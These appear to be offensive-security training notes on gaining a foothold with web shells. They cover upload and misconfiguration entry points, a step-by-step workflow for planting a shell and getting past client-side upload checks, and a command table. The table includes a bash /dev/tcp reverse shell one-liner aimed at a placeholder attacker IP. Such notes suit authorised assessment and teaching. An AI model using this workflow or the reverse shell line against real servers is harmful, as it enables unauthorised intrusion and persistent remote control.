### Web Shell Footholds: Methodology and Implementation

#### Operational Overview

**Web shells** serve as the primary method for establishing a **foothold** during external network assessments when perimeter services (like SMB) are hardened. They provide a browser-based interface to interact directly with the target server's underlying operating system.

#### Identifying Entry Points

Web application vulnerabilities are the most common path for gaining internal network access.

|Vulnerability / Misconfiguration|Context / Scenario|Attack Implication|
|:--|:--|:--|
|**Unrestricted File Upload**|Publicly available forms or authenticated profile sections.|Direct upload of web shell payloads (PHP, JSP, ASP.NET).|
|**Self-Registration Bypass**|Applications allowing user sign-ups with profile picture uploads.|Bypassing **client-side checks** to upload executable code instead of images.|
|**Application Managers**|Services like Tomcat, Axis2, or WebLogic.|Deploying JSP code via **WAR files** as a native function.|
|**Misconfigured FTP**|FTP services with write permissions to the **webroot**.|Direct placement of a web shell into the web-accessible directory.|
|**Web App Vulnerabilities**|SQL injection, RFI/LFI, or command injection.|Leveraging flaws to achieve remote code execution (RCE).|

#### Web Shell Operational Workflow

Use this workflow once a file upload vulnerability or misconfiguration has been identified.

1. **Language Identification:** Determine the language supported by the web server (e.g., PHP, JSP, or ASP.NET).
2. **Payload Preparation:** Craft a web shell payload written in the identified web language.
3. **Bypass Filters:** If client-side checks are present, bypass them to ensure the payload is accepted (common in profile picture uploads).
4. **Upload & Access:** Upload the payload to the server and navigate to the file's URL via a browser to establish a session.
5. **Execution:** Use the browser-based interface to execute OS commands.
6. **Upgrade:** Because web shells can be **unstable** or deleted by automated application processes, use the initial RCE to upgrade to a more interactive **reverse shell** for persistence.

#### Decision Logic: Why Use a Web Shell?

- **When to use:** Use as an initial access vector when the perimeter is hardened against traditional service exploits.
- **Why it matters:** It converts a web-level vulnerability into **Remote Code Execution (RCE)**, allowing interaction with the server's OS.
- **Stability Warning:** Relying solely on a web shell is risky; some applications are configured to **automatically delete uploaded files** after a set duration. Persistence is only achieved by moving from the web shell to a reverse shell.

#### Command Reference

_Note: The current source material provides the conceptual framework for web shells; specific code syntax for different languages is introduced in subsequent sections._

| Action                      | Command / Placeholder                         |
| :-------------------------- | :-------------------------------------------- |
| **Establish Reverse Shell** | `bash -i >& /dev/tcp/<ATTACK_IP>/<PORT> 0>&1` |
| **Access Web Shell**        | `http://<TARGET_IP>/uploads/shell.php`        |